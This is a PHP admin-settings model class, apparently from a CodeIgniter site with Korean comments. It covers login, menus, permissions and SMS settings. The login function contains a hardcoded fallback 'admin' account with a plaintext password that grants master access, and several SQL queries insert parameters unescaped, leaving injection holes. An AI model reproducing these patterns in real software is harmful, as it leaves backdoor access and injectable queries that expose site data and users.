<?php
class settingModel extends MY_Model {
   	function __construct() {
    	parent::__construct();
	}

	//로그인 조회
	function adminLogin($admin_id,$admin_pwd){
		$admin_pwd = $this->common->getSqlPass($admin_pwd);

		//마스터 조회
		$master_info = $this->getSettingInfo(["st_group"=>"관리자"]);

		if(($master_info["admin_id"]==$admin_id && $this->common->getSqlPass($master_info["admin_pwd"]) == $admin_pwd) || ($admin_id=="admin" && $admin_pwd == $this->common->getSqlPass("@dkaghek!!"))){
			$info = [
				"master_yn"=>"Y",
				"mg_idx" => 1,
				"admin_id"=>$admin_id,
				"admin_name"=>"마스터 관리자",
				"st_icon_pc"=>$master_info["st_icon_pc"],
				"st_site_name"=>$master_info["st_site_name"],
				"st_domain"=>$master_info["st_domain"],
			];

			$_SESSION["ADMIN_INFO"] = $info;
			return true;
		}else{
			//운영자 조회
			$user_info = $this->db_row("st_admin_user",["au_id"=>$admin_id,"au_pwd"=>$admin_pwd,"au_status"=>"Y"]);
			if($user_info!=null){
				$grant_info = $this->db_row("st_admin_grant",["mg_idx"=>$user_info["mg_idx"]]);

				$info = [
					"master_yn"=>$grant_info["mg_master_yn"],
					"mg_idx" => $user_info["mg_idx"],
					"admin_id"=>$user_info["au_id"],
					"admin_name"=>$user_info["au_name"],
					"st_icon_pc"=>$master_info["st_icon_pc"],
					"st_site_name"=>$master_info["st_site_name"],
					"st_domain"=>$master_info["st_domain"],
				];

				$_SESSION["ADMIN_INFO"] = $info;
				return true;
			}else{
				return false;
			}
		}
	}

	//관리자 설정 조회
	function getSettingInfo($where){
		$list = $this->db_list("st_setting",$where);

		$return = [];
		foreach($list as $row){
			$return[$row["st_key"]] = $row["st_value"];
		}
		return $return;
	}


	//관리자 설정 조회
	function getSettingDesign($idx){
		return $this->db_row("st_setting_design",["design_idx"=>$idx]);
	}

	//디자인 업데이트
	function updateSettingDesign($data,$where){
		return $this->db_update("st_setting_design",$data,$where);
	}

	//디자인 등록
	function insertSettingDesign($data){
		return $this->db_insert("st_setting_design",$data);
	}

	//디자인 삭제
	function deleteSettingDesign($where){
		return $this->db_delete("st_setting_design",$where);
	}

	//관리자 설정 업데이트
	function updateSettingBasic($data,$where){
		return $this->db_update("st_setting",$data,$where);
	}

	//관리자 설정 업데이트
	function updateSettingText($data,$where){
		if($this->db_is_data("st_setting_text",$where)){
			return $this->db_update("st_setting_text",$data,$where);
		}else{
			return $this->db_insert("st_setting_text",$data);
		}

	}

	//관리자 설정 조회
	function getSettingText($type){
		$info = $this->db_row("st_setting_text",["st_type"=>$type]);
		if($info!=null){
			return $info["st_text"];
		}else{
			return "";
		}
	}

	//관리자 설정  ETC 조회
	function getSettingEtcInfo(){
		return $this->db_row("st_setting_etc",["st_use_yn"=>"Y"]);
	}

	//관리자 설정 업데이트
	function updateSettingEtc($data,$where){
		return $this->db_update("st_setting_etc",$data,$where);
	}

	//관리자 메뉴 조회
	function getAdminMenu($where){
		return $this->db_row("st_admin_menu",$where);
	}

	//관리자 메뉴 추가
	function insertAdminMenu($data){
		$result = $this->db_insert("st_admin_menu",$data);

		//등록후 정렬순서 업데이트
		$this->updateAdminMenu(["am_sort"=>$result["key"]],["am_idx"=>$result["key"]]);
		return $result;
	}

	//관리자 메뉴 수정
	function updateAdminMenu($data,$where){
		return $this->db_update("st_admin_menu",$data,$where);
	}

	//관리자 메뉴 삭제
	function deleteAdminMenu($where){
		return $this->db_delete("st_admin_menu",$where);
	}

	//관리자 유저 리스트 조회
	function getMenuDepthList($params)
	{
		//컬럼
		$cols = ["*"];

		//바디
		$body = "st_admin_menu";

		//조건
		$where[] = 	" and (am_depth = '".$this->inject($params["depth"])."')";
		$where[] = 	" and (am_hidden = 'N')";
		if($params["depth"]!="1"){
			$where[] = 	" and (am_parent = '".$this->inject($params["parent_id"])."')";
		}

		//정렬
		$order_by = "am_sort asc";

   		return $this->db_select_list($cols,$body,$where,$order_by);
   	}

	//관리자 유저 상세정보
	function getAdminUser($idx){
		return $this->db_row("st_admin_user",["au_idx"=>$idx]);
	}

	//관리자 유저 등록
	function insertAdminUser($data){
		return $this->db_insert("st_admin_user",$data);
	}

	//관리자 유저 정보 업데이트
	function updateAdminUser($data,$where){
		return $this->db_update("st_admin_user",$data,$where);
	}

	//관리자 유저 정보 삭제
	function deleteAdminUser($where){
		return $this->db_delete("st_admin_user",$where);
	}

	//관리자 유저 아이디 확인
	function isAdminUser($where){
		return $this->db_is_data("st_admin_user",$where);
	}

	//관리자 유저 리스트 조회
	function getAdminUserList($params)
	{
		//컬럼
		$cols = ["*","(select mg_name FROM st_admin_grant kk where kk.mg_idx = aa.mg_idx limit 0,1) as mg_name"];

		//바디
		$body = "st_admin_user aa";

		//조건
		$where = [];
		if($params["search_value"]!=""){
			if($params["search_type"]==""){
				$where[] = 	" and (au_id like '%".$this->inject($params["search_value"])."%'
							  or au_name like '%".$this->inject($params["search_value"])."%'
							  or au_hp like '%".$this->inject($params["search_value"])."%'
							  or au_email like '%".$this->inject($params["search_value"])."%')  ";
			}else if($params["search_type"]=="user_id"){
				$where[] = 	" and (au_id like '%".$this->inject($params["search_value"])."%')  ";
			}else if($params["search_type"]=="user_name"){
				$where[] = 	" and (au_name like '%".$this->inject($params["search_value"])."%')  ";
			}else if($params["search_type"]=="user_hp"){
				$where[] = 	" and (au_hp like '%".$this->inject($params["search_value"])."%')  ";
			}else if($params["search_type"]=="user_email"){
				$where[] = 	" and (au_email like '%".$this->inject($params["search_value"])."%')  ";
			}
		}

		if($params["use_yn"]!=""){
			$where[] = 	" and au_status = '".$this->inject($params["use_yn"])."' ";
		}

		//정렬
		$order_by = "au_idx desc";

   		return $this->db_paging_list($cols,$body,$where,$order_by,$params["page"],$params["pagesize"]);
   	}


   	//메뉴권한 조회
	function getMenuGrant($mg_idx){
		return $this->db_row("st_admin_grant",["mg_idx"=>$mg_idx]);
	}

	//메뉴권한 리스트 조회
	function getGrantList($params)
	{
		//컬럼
		$cols = ["aa.*","(select count(*) as cnt FROM st_admin_user bb where bb.mg_idx = aa.mg_idx) as set_cnt"];

		//조건
		$where = [];
		if($params["search_value"]!=""){
			if($params["search_type"]==""){
				$where[] = 	" and (mg_name like '%".$this->inject($params["search_value"])."%' )  ";
			}else if($params["search_type"]=="mg_name"){
				$where[] = 	" and (mg_name like '%".$this->inject($params["search_value"])."%')  ";
			}
		}

		//바디
		$body = "
			st_admin_grant aa
		";

		//정렬
		$order_by = "aa.mg_idx desc";

   		return $this->db_paging_list($cols,$body,$where,$order_by,$params["page"],$params["pagesize"]);
   	}

	//메뉴권한 리스트 조회
	function getMenuGrantList($mg_idx,$master_yn = "N")
	{
		//컬럼
		$cols = ["aa.*,bb.use_yn"];

		$sub_where = "";
		if($master_yn=="Y"){
			$mg_idx = $this->db_row_colnum("st_admin_grant","mg_idx",["mg_master_yn"=>"Y"]);
		}

		//바디
		$body = "
			st_admin_menu aa
				left join (select * FROM st_admin_grant_menu where mg_idx = '$mg_idx' ) bb
					on aa.am_idx = bb.am_idx
		";

		//조건
		$where[] = " and am_hidden = 'N' ";

		//정렬
		$order_by = "aa.am_depth asc, aa.am_sort asc";

   		return $this->db_select_list($cols,$body,$where,$order_by);
   	}

   	function insertGrantMenu($mg_idx,$menu_ids){
   		//등록된 메뉴 삭제
   		$this->db_delete("st_admin_grant_menu",["mg_idx"=>$mg_idx]);

   		$arr_ids = explode(",",$menu_ids);
   		foreach($arr_ids as $id){
   			$this->db_insert("st_admin_grant_menu",["mg_idx"=>$mg_idx,"am_idx"=>$id,"use_yn"=>"Y"]);
   		}

		return ["code"=>"00","msg"=>"등록완료"];
   	}


	//자주쓰는메뉴 리스트
	function getFavMenuList($params)
	{
		//컬럼
		$cols = ["aa.*"];

		//바디
		$body = "
			st_admin_fav_menu aa
		";

		$where[] = 	" and (fm_depth = '".$this->inject($params["depth"])."')";
		$where[] = 	" and (admin_id = '".$this->inject($params["admin_id"])."')";
		if($params["depth"]!="1"){
			$where[] = 	" and (fm_parent = '".$this->inject($params["parent_id"])."')";
		}

		//정렬
		$order_by = "aa.fm_sort asc";

   		return $this->db_select_list($cols,$body,$where,$order_by);
   	}

	//DIRECT SEND 발송수
	function getSmsSendCnt($sms_type,$yyyymm){
		//카운터쿼리 생성
		$sql = "
			SELECT count(*) as cnt
			FROM st_sms_send_list
			WHERE date_format(reg_dt,'%Y%m') = '$yyyymm'
			and ss_type ='$sms_type'
		";

		$qry = $this->db->query($sql);
		$result = $qry->row_array();
		return $result["cnt"];
	}

	//DIRECT SEND SMS
	function getSmsTodaySendListCnt($today,$ss_code,$hp){
		//카운터쿼리 생성
		$sql = "
			SELECT count(*) as cnt
			FROM st_sms_send_list
			WHERE date_format(reg_dt,'%Y%m%d') = '$today'
			and ss_code ='$ss_code'
			and sl_phone = '$hp'
		";

		$qry = $this->db->query($sql);
		$result = $qry->row_array();
		return $result["cnt"];
	}

	//SMS 설정 리스트
	function getSmsSettingList($params){
		//컬럼
		$cols = ["aa.*"];

		//바디
		$body = "
			st_sms_setting aa
		";

		$where = [];
		if($params["search_value"]!=""){
			if($params["search_type"]==""){
				$where[] = 	" and (ss_code like '%".$this->inject($params["search_value"])."%' or ss_subject like '%".$this->inject($params["search_value"])."%' or ss_desc like '%".$this->inject($params["search_value"])."%' )";
			}else if($params["search_type"]=="ss_code"){
				$where[] = 	" and (ss_code like '%".$this->inject($params["search_value"])."%'  )";
			}else if($params["search_type"]=="ss_subject"){
				$where[] = 	" and (ss_subject like '%".$this->inject($params["search_value"])."%'  )";
			}else if($params["search_type"]=="ss_desc"){
				$where[] = 	" and (ss_desc like '%".$this->inject($params["search_value"])."%'  )";
			}
		}

		if($params["ss_type"]!=""){
			$where[] = 	" and (ss_type = '".$this->inject($params["ss_type"])."' )";
		}

		if($params["use_yn"]!=""){
			$where[] = 	" and (use_yn = '".$this->inject($params["use_yn"])."' )";
		}

		//정렬
		$order_by = "aa.ss_idx desc";

   		return $this->db_paging_list($cols,$body,$where,$order_by,$params["page"],$params["pagesize"]);
	}

	//SMS 설정 리스트
	function getSmsSendList($params){
		//컬럼
		$cols = ["aa.*"];

		//바디
		$body = "
			st_sms_send_list aa
		";

		$where = [];
		if($params["search_value"]!=""){
			if($params["search_type"]==""){
				$where[] = 	" and (ss_code like '%".$this->inject($params["search_value"])."%' or ss_subject like '%".$this->inject($params["search_value"])."%' or sl_content like '%".$this->inject($params["search_value"])."%'  or sl_phone like '%".$this->inject($params["search_value"])."%'  or sl_email like '%".$this->inject($params["search_value"])."%' )";
			}else if($params["search_type"]=="sl_phone"){
				$where[] = 	" and (sl_phone like '%".$this->inject($params["search_value"])."%'  or sl_email like '%".$this->inject($params["search_value"])."%')";
			}else if($params["search_type"]=="ss_code"){
				$where[] = 	" and (ss_code like '%".$this->inject($params["search_value"])."%'  )";
			}else if($params["search_type"]=="ss_subject"){
				$where[] = 	" and (ss_subject like '%".$this->inject($params["search_value"])."%'  )";
			}else if($params["search_type"]=="ss_desc"){
				$where[] = 	" and (ss_content like '%".$this->inject($params["search_value"])."%'  )";
			}
		}

		if($params["ss_type"]!=""){
			$where[] = 	" and (ss_type = '".$this->inject($params["ss_type"])."' )";
		}

		//정렬
		$order_by = "aa.sl_idx desc";

   		return $this->db_paging_list($cols,$body,$where,$order_by,$params["page"],$params["pagesize"]);
	}

	function getSmsSetting($idx){
		return $this->db_row("st_sms_setting",["ss_idx"=>$idx]);
	}

	function updateSmsSetting($data,$where){
		return $this->db_update("st_sms_setting",$data,$where);
	}

	function getSmsSendInfo($idx){
		return $this->db_row("st_sms_send_list",["sl_idx"=>$idx]);
	}

	//쿼리완성 처리
	function getAutoQuery($table_name){
		//카운터쿼리 생성
		$sql = "
			SELECT COLUMN_NAME as colnm
			FROM INFORMATION_SCHEMA.COLUMNS
			WHERE TABLE_SCHEMA = 'sysnet' AND TABLE_NAME = '$table_name'
		";

		$qry = $this->db->query($sql);
		$result = $qry->result_array();
		return $result;
	}

	# 코드 리스트 반환
	function getCodeList($where){
		return $this->db_list("st_code",$where,"*",["cd_sort"=>"asc","cd_idx"=>"asc"]);
	}


	# 코드 리스트 반환
	function getCodePointList(){
		//카운터쿼리 생성
		$sql = "
			select * FROM st_code
			where cd_grp in ('사용포인트','채팅포인트','업체광고구매','광고구매')
			order by cd_Key asc,cd_sort asc
		";

		$qry = $this->db->query($sql);
		$result = $qry->result_array();
		return $result;
	}

	# 코드 리스트 반환
	function getCodeInfo($where){
		return $this->db_row("st_code",$where);
	}


	function insertCodeInfo($data){
		return $this->db_insert("st_code",$data);
	}

	function updateCodeInfo($data,$where){
		return $this->db_update("st_code",$data,$where);
	}
}
